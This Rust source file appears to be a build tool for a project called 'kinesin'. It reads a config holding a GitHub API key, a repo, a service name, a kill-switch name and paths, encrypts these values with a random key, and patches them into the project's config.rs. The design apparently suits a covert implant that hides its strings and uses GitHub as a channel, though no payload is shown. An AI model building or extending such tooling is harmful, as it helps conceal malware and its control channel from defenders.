mod utils;

use std::{env, io, process};
use std::fs::File;
use std::io::{Read, Seek, SeekFrom, Write};
use std::path::PathBuf;

use serde::Deserialize;
use json_comments::StripComments;

#[derive(Debug, Deserialize)]
struct Config {
    api_key: String,
    repo_name: String,
    repo_owner: String,

    service_name: String,
    service_file_name: String,
    kill_switch_file_name: String,
    log_file_name: String,
    base_directory: String
}

fn main() -> io::Result<()> {
    let args = env::args()
        .skip(1)
        .collect::<Vec<String>>();

    if args.len() <= 0 {
        eprintln!("you need to provide the path of the project directory");
        process::exit(1);
    }

    let project_path = PathBuf::from(args[0].to_string());
    if !project_path.exists() || !project_path.is_dir() {
        eprintln!("you need to provide the path of the project directory");
        process::exit(1);
    }

    println!("project directory - {}", project_path.display());

    let config_path = project_path.join("config.jsonc");
    if !config_path.exists() || !config_path.is_file() {
        eprintln!("failed to find config file");
        process::exit(1);
    }

    println!("config file - {}", config_path.display());

    let config_file = match File::open(config_path) {
        Ok(file) => file,
        Err(err) => {
            eprintln!("failed to open config file - {}", err);
            process::exit(1);
        }
    };

    let stripped = StripComments::new(config_file);

    let config = match serde_json::from_reader::<_, Config>(stripped) {
        Ok(data) => data,
        Err(err) => {
            eprintln!("failed to parse config - {}", err);
            process::exit(1);
        }
    };

    if has_empty(&config) {
        eprintln!("1 or more config options is empty");
        process::exit(1);
    }

    let encryption_key_str = lib::random::gen_string(100);
    let encryption_key = lib::hash::sha256(encryption_key_str.as_bytes(), &[]);

    let kill_switch = lib::random::gen_string(100);

    utils::set_key(&encryption_key);

    let api_key = utils::encrypt(&config.api_key);
    let repo_name = utils::encrypt(&config.repo_name);
    let repo_owner = utils::encrypt(&config.repo_owner);
    let service_name = utils::encrypt(&config.service_name);
    let kill_switch_file_name = utils::encrypt(&config.kill_switch_file_name);
    let log_file_name = utils::encrypt(&config.log_file_name);
    let base_directory = utils::encrypt(&config.base_directory);

    let kill_switch_hash = lib::hash::sha256(kill_switch.as_bytes(), &encryption_key);

    let kinesin_config_path = project_path.join("main\\src\\config.rs");
    if !kinesin_config_path.exists() || !kinesin_config_path.is_file() {
        eprintln!("failed to find kinesin config file");
        process::exit(1);
    }

    println!("kinesin config file - {}", kinesin_config_path.display());

    let mut kinesin_config_file = File::options()
        .read(true)
        .write(true)
        .open(kinesin_config_path)?;

    let mut to_replace = String::new();
    kinesin_config_file.read_to_string(&mut to_replace)?;

    utils::edit_var(&mut to_replace, "SERVICE_NAME", &service_name);
    utils::edit_var(&mut to_replace, "LOG_FILE_NAME", &log_file_name);
    utils::edit_var(&mut to_replace, "BASE_DIR_PATH", &base_directory);
    utils::edit_var(&mut to_replace, "CRYPTO_KEY", &encryption_key);
    utils::edit_var(&mut to_replace, "KILL_SWITCH_FILE_NAME", &kill_switch_file_name);
    utils::edit_var(&mut to_replace, "KILL_SWITCH_HASH", &kill_switch_hash);
    utils::edit_var(&mut to_replace, "GITHUB_API_KEY", &api_key);
    utils::edit_var(&mut to_replace, "GITHUB_REPO", &repo_name);
    utils::edit_var(&mut to_replace, "GITHUB_OWNER", &repo_owner);

    kinesin_config_file.set_len(0)?;
    kinesin_config_file.seek(SeekFrom::Start(0))?;
    kinesin_config_file.write_all(to_replace.as_bytes())?;

    println!("config has been updated");

    // compile
    // upload
    // write script
    // upload
    // write build data

    Ok(())
}

fn finish_build() -> PathBuf {
    PathBuf::new()
}

fn upload_file() -> String {
    String::new()
}

fn has_empty(config: &Config) -> bool {
    config.api_key.trim().is_empty()
        || config.repo_name.trim().is_empty()
        || config.repo_owner.trim().is_empty()
        || config.service_name.trim().is_empty()
        || config.service_file_name.trim().is_empty()
        || config.kill_switch_file_name.trim().is_empty()
        || config.log_file_name.trim().is_empty()
        || config.base_directory.trim().is_empty()
}